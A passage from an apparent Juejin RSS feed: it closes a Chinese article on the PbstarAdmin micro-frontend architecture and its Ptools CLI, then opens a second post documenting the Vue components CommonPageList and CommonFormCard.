<li>代码审查隔离：每个子应用可以有自己的Code Review流程</li>
<li>敏感代码保护：核心业务代码可以放在内部子应用中</li>
</ul>
<p><strong>依赖管理</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 每个子应用可以有自己的依赖，不会冲突</span>
{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"system-subapp"</span>,
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"vue"</span>: <span class="hljs-string">"^3.5.18"</span>,
    <span class="hljs-string">"element-plus"</span>: <span class="hljs-string">"^2.10.7"</span>,
    <span class="hljs-comment">// 子应用特定的依赖</span>
    <span class="hljs-string">"echarts"</span>: <span class="hljs-string">"^5.4.0"</span>
  }
}

<span class="hljs-comment">// 另一个子应用可以用不同版本</span>
{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"equipment-subapp"</span>,
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"vue"</span>: <span class="hljs-string">"^3.5.18"</span>,
    <span class="hljs-string">"element-plus"</span>: <span class="hljs-string">"^2.8.0"</span>,
    <span class="hljs-string">"echarts"</span>: <span class="hljs-string">"^4.9.0"</span>  <span class="hljs-comment">// 版本不一样，但不会冲突</span>
  }
}
</code></pre>
<p><strong>故障隔离</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 子应用A构建出错了，不会影响子应用B</span>
<span class="hljs-keyword">const</span> appConfigs = {
  <span class="hljs-attr">system</span>: <span class="hljs-title function_">createAppConfig</span>({ <span class="hljs-attr">key</span>: <span class="hljs-string">"system"</span> }), <span class="hljs-comment">// ✅ 正常构建</span>
  <span class="hljs-attr">equipment</span>: <span class="hljs-title function_">createAppConfig</span>({ <span class="hljs-attr">key</span>: <span class="hljs-string">"equipment"</span> }), <span class="hljs-comment">// ❌ 构建失败</span>
  <span class="hljs-attr">example</span>: <span class="hljs-title function_">createAppConfig</span>({ <span class="hljs-attr">key</span>: <span class="hljs-string">"example"</span> }), <span class="hljs-comment">// ✅ 不受影响</span>
};
</code></pre>
<h3 data-id="heading-18">Ptools 工具链</h3>
<p>Ptools 是项目内置的 CLI 工具，通过交互式命令简化开发流程，避免手动配置复杂的参数。</p>
<h4 data-id="heading-19">为什么需要 Ptools</h4>
<p><strong>直接使用构建命令的问题</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 需要记住复杂的命令和参数</span>
rsbuild build --environment equipment --port 8803

<span class="hljs-comment"># 容易敲错，还得手动指定端口和环境</span>
rsbuild dev --environment system --port 8801
</code></pre>
<h4 data-id="heading-20">核心命令</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动开发环境 - 交互式选择</span>
pnpm run dev

<span class="hljs-comment"># 构建指定子应用</span>
pnpm run build

<span class="hljs-comment"># 创建新的子应用 - 引导式创建</span>
pnpm run create

<span class="hljs-comment"># 添加/移除依赖包 - 精确到具体工程</span>
pnpm run add
pnpm run remove
</code></pre>
<h4 data-id="heading-21">实现示例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// tools/cli/build.mjs - 构建命令其实就是帮你选一下</span>
<span class="hljs-keyword">const</span> list = [<span class="hljs-string">"main"</span>, ...apps.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">key</span>)];

program
  .<span class="hljs-title function_">version</span>(<span class="hljs-string">"1.0.0"</span>)
  .<span class="hljs-title function_">description</span>(<span class="hljs-string">"启动应用模块"</span>)
  .<span class="hljs-title function_">action</span>(<span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> answers = <span class="hljs-keyword">await</span> inquirer.<span class="hljs-title function_">prompt</span>([
        {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"list"</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">"appKey"</span>,
          <span class="hljs-attr">message</span>: <span class="hljs-string">"请选择要启动的应用模块:"</span>,
          <span class="hljs-attr">choices</span>: list,
        },
      ]);
      <span class="hljs-keyword">const</span> { appKey } = answers;
      <span class="hljs-keyword">let</span> command = <span class="hljs-string">""</span>;
      <span class="hljs-keyword">if</span> (appKey === <span class="hljs-string">"main"</span>) {
        command = <span class="hljs-string">"rsbuild dev --environment main --port 8800 --open"</span>;
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">const</span> app = apps.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">key</span> === appKey);
        command = <span class="hljs-string">`rsbuild dev --environment <span class="hljs-subst">${appKey}</span> --port <span class="hljs-subst">${app.devPort}</span>`</span>;
      }
      <span class="hljs-title function_">execSync</span>(command, { <span class="hljs-attr">stdio</span>: <span class="hljs-string">"inherit"</span>, <span class="hljs-attr">cwd</span>: <span class="hljs-string">"../"</span> });
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(chalk.<span class="hljs-title function_">red</span>(<span class="hljs-string">"Error:"</span>), err);
      process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
    }
  });
</code></pre>
<h4 data-id="heading-22">优势特点</h4>
<ol>
<li><strong>不用记配置</strong>：开发者不用了解底层的Rsbuild配置</li>
<li><strong>不会选错</strong>：自动发现可用的子应用，避免手打错误</li>
<li><strong>统一入口</strong>：所有操作都通过统一的CLI，比较好记</li>
<li><strong>减少出错</strong>：内置参数验证和错误处理</li>
<li><strong>流程统一</strong>：确保团队成员用相同的流程</li>
</ol>
<h4 data-id="heading-23">子应用创建流程</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// tools/cli/create.mjs - 智能创建子应用</span>
<span class="hljs-keyword">const</span> answers = <span class="hljs-keyword">await</span> inquirer.<span class="hljs-title function_">prompt</span>([
  {
    <span class="hljs-attr">type</span>: <span class="hljs-string">"list"</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">"appType"</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">"子应用类型:"</span>,
    <span class="hljs-attr">choices</span>: [<span class="hljs-string">"in"</span>, <span class="hljs-string">"out"</span>],
  },
  {
    <span class="hljs-attr">type</span>: <span class="hljs-string">"input"</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">"appKey"</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">"子应用Key:"</span>,
    <span class="hljs-attr">validate</span>: <span class="hljs-function">(<span class="hljs-params">input</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-z0-9-]+$/</span>.<span class="hljs-title function_">test</span>(input)) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"子应用Key只能包含小写字母、数字和连字符"</span>;
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    },
  },
]);

<span class="hljs-comment">// 外部子应用就加个git子模块</span>
<span class="hljs-keyword">if</span> (appType === <span class="hljs-string">"out"</span> &amp;&amp; gitUrl) {
  <span class="hljs-title function_">execSync</span>(<span class="hljs-string">`git submodule add <span class="hljs-subst">${gitUrl}</span> apps/<span class="hljs-subst">${appKey}</span>`</span>, {
    <span class="hljs-attr">cwd</span>: path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">"../../"</span>),
    <span class="hljs-attr">stdio</span>: <span class="hljs-string">"inherit"</span>,
  });
}
</code></pre>
<h3 data-id="heading-24">实际使用效果</h3>
<p><strong>开发体验</strong></p>
<ul>
<li><strong>独立开发</strong>：每个团队可以独立开发自己的微应用，互不干扰</li>
<li><strong>构建速度</strong>：单个微应用构建比整个项目快很多</li>
<li><strong>热更新</strong>：修改一个微应用不会影响其他应用，热更新很快</li>
</ul>
<p><strong>部署运维</strong></p>
<ul>
<li><strong>独立部署</strong>：每个微应用可以独立部署，降低风险</li>
<li><strong>灰度发布</strong>：支持微应用级别的灰度发布</li>
<li><strong>故障隔离</strong>：单个微应用出错不会影响整个系统</li>
</ul>
<p><strong>团队协作</strong></p>
<ul>
<li><strong>团队自治</strong>：每个团队负责自己的微应用，职责清晰</li>
<li><strong>技术选型自由</strong>：不同团队可以选择最适合的技术栈</li>
<li><strong>并行开发</strong>：多个团队可以并行开发，提高效率</li>
</ul>
<h2 data-id="heading-25">快速开始</h2>
<h3 data-id="heading-26">安装部署</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 克隆项目</span>
git <span class="hljs-built_in">clone</span> https://github.com/pbstar/pbstar-admin.git

<span class="hljs-comment"># 进入项目目录</span>
<span class="hljs-built_in">cd</span> pbstar-admin

<span class="hljs-comment"># 克隆外部子应用仓库（可选）</span>
git submodule update --init

<span class="hljs-comment"># 安装依赖</span>
pnpm install

<span class="hljs-comment"># 使用Ptools启动开发环境</span>
pnpm run dev
<span class="hljs-comment"># 交互式选择要启动的子应用</span>

<span class="hljs-comment"># 构建项目</span>
pnpm run build
<span class="hljs-comment"># 选择要构建的子应用</span>

<span class="hljs-comment"># 创建新的子应用</span>
pnpm run create
</code></pre>
<h3 data-id="heading-27">使用示例</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 开发环境 - 交互式选择子应用</span>
$ pnpm run dev
? 请选择要启动的应用模块: (Use arrow keys)
❯ main
  system
  example
  equipment

<span class="hljs-comment"># 构建指定子应用</span>
$ pnpm run build
? 请选择要构建的应用模块: (Use arrow keys)
❯ main
  system
  example
  equipment

<span class="hljs-comment"># 添加依赖包到指定工程</span>
$ pnpm run add
? 请选择要添加依赖包的工程: (Use arrow keys)
❯ 全局工程
  assets
  components
  tools
  main
  system
  example
  equipment
? 请输入要添加的依赖包名称: axios
? 请选择要添加的依赖包类型: (Use arrow keys)
❯ dependencies
  devDependencies
</code></pre>
<h2 data-id="heading-28">总结</h2>
<p>单体架构就像一艘巨大的航空母舰，虽然功能强大，但转向困难，维护成本高。而微前端架构就像一支现代化的舰队，每艘舰艇都有自己的使命，既能独立作战，又能协同配合。</p>
<p>通过微前端实践，我发现在后台系统中的优势确实很明显：</p>
<ul>
<li><strong>开发效率</strong>：构建速度快了很多，热更新基本是秒级</li>
<li><strong>部署运维</strong>：可以独立部署，不用每次都全量发布</li>
<li><strong>团队协作</strong>：各团队负责自己的模块，冲突少了很多</li>
<li><strong>系统稳定性</strong>：一个模块出问题不会拖垮整个系统</li>
</ul>
<p>当然，微前端也有它的复杂性，比如通信机制、状态同步等问题。但总的来说，对于大型后台系统，微前端是一个值得考虑的方向。</p>
<p>如果你也在做后台系统，建议可以试试看微前端的思路，或许能解决你当前遇到的一些痛点。</p>
<h2 data-id="heading-29">相关资料</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpbstar%2Fpbstar-admin" target="_blank" title="https://github.com/pbstar/pbstar-admin" ref="nofollow noopener noreferrer">PbstarAdmin 项目地址</a></li>
<li><a href="https://link.juejin.cn?target=http%3A%2F%2Fpbstar-admin-docs.pbstar.cn%2F" target="_blank" title="http://pbstar-admin-docs.pbstar.cn/" ref="nofollow noopener noreferrer">PbstarAdmin 文档地址</a></li>
<li><a href="https://link.juejin.cn?target=http%3A%2F%2Fpbstar-admin.pbstar.cn%2F" target="_blank" title="http://pbstar-admin.pbstar.cn/" ref="nofollow noopener noreferrer">PbstarAdmin 在线演示</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2Fwujie" target="_blank" title="https://github.com/Tencent/wujie" ref="nofollow noopener noreferrer">腾讯 wujie 微前端框架</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fweb-infra-dev%2Frsbuild" target="_blank" title="https://github.com/web-infra-dev/rsbuild" ref="nofollow noopener noreferrer">Rsbuild 构建工具</a></li>
</ul>
<hr/>
<blockquote>
<p>💡 这里是初辰，一个有理想的切图仔！</p>
<p>🎉 如果本文对你有帮助，别忘了点赞、收藏、评论哦！</p>
<p>⭐ 最后，别忘了 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpbstar%2Fpbstar-admin" target="_blank" title="https://github.com/pbstar/pbstar-admin" ref="nofollow noopener noreferrer">给项目点个Star</a></strong> 哦！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[通用组件使用文档]]></title>    <link>https://juejin.cn/post/7584037286029000754</link>    <guid>https://juejin.cn/post/7584037286029000754</guid>    <pubDate>2025-12-16T08:04:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584037286029000754" data-draft-id="7584073390693777423" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="通用组件使用文档"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-16T08:04:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="空镜"/> <meta itemprop="url" content="https://juejin.cn/user/3122268755469101"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            通用组件使用文档
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3122268755469101/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    空镜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:04:02.000Z" title="Tue Dec 16 2025 08:04:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">通用组件使用文档</h2>
<p>本文档介绍了项目中两个核心通用组件的使用方法：<code>CommonPageList</code>（通用列表组件）和 <code>CommonFormCard</code>（通用表单组件）。</p>
<h3 data-id="heading-1">目录</h3>
<ul>
<li><a href="#commonpagelist-%E9%80%9A%E7%94%A8%E5%88%97%E8%A1%A8%E7%BB%84%E4%BB%B6" title="#commonpagelist-%E9%80%9A%E7%94%A8%E5%88%97%E8%A1%A8%E7%BB%84%E4%BB%B6">CommonPageList 通用列表组件</a>
<ul>
<li><a href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95" title="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">基本用法</a></li>
<li><a href="#%E5%B1%9E%E6%80%A7%E9%85%8D%E7%BD%AE" title="#%E5%B1%9E%E6%80%A7%E9%85%8D%E7%BD%AE">属性配置</a></li>
<li><a href="#%E6%8F%92%E6%A7%BD%E8%AF%B4%E6%98%8E" title="#%E6%8F%92%E6%A7%BD%E8%AF%B4%E6%98%8E">插槽说明</a></li>
<li><a href="#%E6%9A%B4%E9%9C%B2%E6%96%B9%E6%B3%95" title="#%E6%9A%B4%E9%9C%B2%E6%96%B9%E6%B3%95">暴露方法</a></li>
</ul>
</li>
<li><a href="#commonformcard-%E9%80%9A%E7%94%A8%E8%A1%A8%E5%8D%95%E7%BB%84%E4%BB%B6" title="#commonformcard-%E9%80%9A%E7%94%A8%E8%A1%A8%E5%8D%95%E7%BB%84%E4%BB%B6">CommonFormCard 通用表单组件</a>
<ul>
<li><a href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95-1" title="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95-1">基本用法</a></li>
<li><a href="#%E5%B1%9E%E6%80%A7%E9%85%8D%E7%BD%AE-1" title="#%E5%B1%9E%E6%80%A7%E9%85%8D%E7%BD%AE-1">属性配置</a></li>
<li><a href="#%E6%8F%92%E6%A7%BD%E8%AF%B4%E6%98%8E-1" title="#%E6%8F%92%E6%A7%BD%E8%AF%B4%E6%98%8E-1">插槽说明</a></li>
<li><a href="#%E6%9A%B4%E9%9C%B2%E6%96%B9%E6%B3%95-1" title="#%E6%9A%B4%E9%9C%B2%E6%96%B9%E6%B3%95-1">暴露方法</a></li>
</ul>
</li>
<li><a href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5" title="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5">最佳实践</a></li>
</ul>
<hr/>
<h3 data-id="heading-2">CommonPageList 通用列表组件</h3>
<p><code>CommonPageList</code> 是一个高度封装的列表页面组件，集成了搜索、表格展示、分页、操作按钮等功能。</p>
<h4 data-id="heading-3">基本用法</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;CommonPageList
    :listUrl="'/api/list'"
    :deleteUrl="'/api/delete'"
    :searchConfig="searchConfig"
    :tableButtons="tableButtons"
    :middleButtons="middleButtons"
    ref="pageListRef"
  /&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import { CommonPageList, type ICommonPageListRef } from '@/components/commonPageList'
import { ref } from 'vue'
import type {
  ISearchConfigItem,
  ITableButtons,
  IMiddleButtons
} from '@/components/commonPageList/types'

const pageListRef = ref&lt;ICommonPageListRef&gt;()

// 搜索配置
const searchConfig: ISearchConfigItem[] = [
  {
    component: 'input',
    label: '用户名',
    fieldName: 'username'
  },
  {
    component: 'select',
    label: '状态',
    fieldName: 'status',
    options: [
      { label: '启用', value: '1' },
      { label: '禁用', value: '0' }
    ]
  },
  {
    component: 'datePicker',
    label: '创建时间',
    fieldName: 'createTime'
  }
]

// 表格操作按钮
const tableButtons: ITableButtons = [
  {
    text: '编辑',
    code: ['system:user:edit'],
    action: (row: any) =&gt; {
      console.log('编辑用户:', row)
    }
  },
  {
    text: '删除',
    code: ['system:user:delete'],
    action: (row: any) =&gt; {
      console.log('删除用户:', row)
    }
  }
]

// 中间操作按钮
const middleButtons: IMiddleButtons = [
  {
    text: '新增用户',
    type: 'primary',
    code: ['system:user:create'],
    action: () =&gt; {
      console.log('新增用户')
    }
  },
  {
    text: '批量删除',
    type: 'delete',
    code: ['system:user:delete']
  }
]
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-4">属性配置</h4>







































































































<table><thead><tr><th>属性名</th><th>类型</th><th>默认值</th><th>必填</th><th>说明</th></tr></thead><tbody><tr><td><code>listUrl</code></td><td><code>string</code></td><td>-</td><td>✅</td><td>列表数据请求地址</td></tr><tr><td><code>deleteUrl</code></td><td><code>string</code></td><td>-</td><td>❌</td><td>删除请求地址</td></tr><tr><td><code>searchConfig</code></td><td><code>ISearchConfigItem[]</code></td><td><code>[]</code></td><td>✅</td><td>搜索表单配置</td></tr><tr><td><code>tabs</code></td><td><code>ITabItem[] | Function</code></td><td><code>[]</code></td><td>❌</td><td>选项卡配置</td></tr><tr><td><code>defaultForm</code></td><td><code>Record&lt;string, any&gt;</code></td><td><code>{}</code></td><td>❌</td><td>默认表单数据</td></tr><tr><td><code>middleButtons</code></td><td><code>IMiddleButtons</code></td><td><code>[]</code></td><td>❌</td><td>页面中间按钮配置</td></tr><tr><td><code>tableButtons</code></td><td><code>ITableButtons</code></td><td><code>[]</code></td><td>❌</td><td>表格行操作按钮配置</td></tr><tr><td><code>showSelection</code></td><td><code>boolean</code></td><td><code>false</code></td><td>❌</td><td>是否显示选择列</td></tr><tr><td><code>searchExpandNum</code></td><td><code>number</code></td><td><code>3</code></td><td>❌</td><td>展开显示的搜索项数量</td></tr><tr><td><code>tabFieldName</code></td><td><code>string</code></td><td><code>'tab'</code></td><td>❌</td><td>选项卡字段名</td></tr><tr><td><code>sortableLabels</code></td><td><code>string[]</code></td><td><code>[]</code></td><td>❌</td><td>可排序的字段标签</td></tr><tr><td><code>listMethod</code></td><td><code>'get' | 'post'</code></td><td><code>'get'</code></td><td>❌</td><td>列表请求方法</td></tr><tr><td><code>tableOperateBtnUnhiddenNumber</code></td><td><code>number</code></td><td><code>2</code></td><td>❌</td><td>表格操作按钮显示数量</td></tr></tbody></table>
<h5 data-id="heading-5">搜索配置 (ISearchConfigItem)</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ISearchConfigItem</span> {
  <span class="hljs-attr">component</span>: <span class="hljs-string">'input'</span> | <span class="hljs-string">'select'</span> | <span class="hljs-string">'datePicker'</span> <span class="hljs-comment">// 组件类型</span>
  <span class="hljs-attr">label</span>: <span class="hljs-built_in">string</span> <span class="hljs-comment">// 标签文本</span>
  <span class="hljs-attr">fieldName</span>: <span class="hljs-built_in">string</span> <span class="hljs-comment">// 字段名</span>
  options?: { <span class="hljs-attr">label</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span> }[] <span class="hljs-comment">// 下拉选项（select组件用）</span>
  maxLength?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// 最大长度（input组件用）</span>
  multiple?: <span class="hljs-built_in">boolean</span> <span class="hljs-comment">// 是否多选（select组件用）</span>
  placeholder?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// 占位符</span>
  virtual?: <span class="hljs-built_in">boolean</span> <span class="hljs-comment">// 是否虚拟滚动（select组件用）</span>
  <span class="hljs-comment">// ... 其他自定义属性</span>
}
</code></pre>
<h5 data-id="heading-6">选项卡配置 (ITabItem)</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ITabItem</span> {
  <span class="hljs-attr">label</span>: <span class="hljs-built_in">string</span> <span class="hljs-comment">// 选项卡显示文本</span>
  <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span> <span class="hljs-comment">// 选项卡值</span>
}
</code></pre>
<h5 data-id="heading-7">按钮配置</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 中间按钮配置</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IMiddleButtons</span> {
  text?: <span class="hljs-built_in">string</span>                    <span class="hljs-comment">// 按钮文本</span>
  action?: <span class="hljs-function">(<span class="hljs-params">params: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>   <span class="hljs-comment">// 点击事件</span>
  code?: <span class="hljs-built_in">string</span>[]                  <span class="hljs-comment">// 权限标识</span>
  <span class="hljs-keyword">type</span>?: <span class="hljs-built_in">string</span>                    <span class="hljs-comment">// 按钮类型</span>
}

<span class="hljs-comment">// 表格操作按钮配置</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ITableButtons</span> {
  text?: <span class="hljs-built_in">string</span>                             <span class="hljs-comment">// 按钮文本</span>
  action?: <span class="hljs-function">(<span class="hljs-params">params: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>           <span class="hljs-comment">// 点击事件</span>
  code?: <span class="hljs-built_in">string</span>[]                           <span class="hljs-comment">// 权限标识</span>
  show?: <span class="hljs-built_in">boolean</span> \| (<span class="hljs-function">(<span class="hljs-params">row: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">boolean</span>) <span class="hljs-comment">// 显示条件</span>
}
</code></pre>
<h4 data-id="heading-8">插槽说明</h4>




















<table><thead><tr><th>插槽名</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>table-col-{fieldName}</code></td><td><code>{ value, row }</code></td><td>自定义表格列渲染</td></tr><tr><td><code>default</code></td><td>-</td><td>默认插槽</td></tr></tbody></table>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- 自定义表格列 --&gt;
&lt;template #table-col-用户名="{ value, row }"&gt;
  &lt;el-tag&gt;{{ value }}&lt;/el-tag&gt;
&lt;/template&gt;
</code></pre>
<h4 data-id="heading-9">暴露方法</h4>

















<table><thead><tr><th>方法名</th><th>参数</th><th>返回值</th><th>说明</th></tr></thead><tbody><tr><td><code>refresh</code></td><td>-</td><td><code>void</code></td><td>刷新列表数据</td></tr></tbody></table>
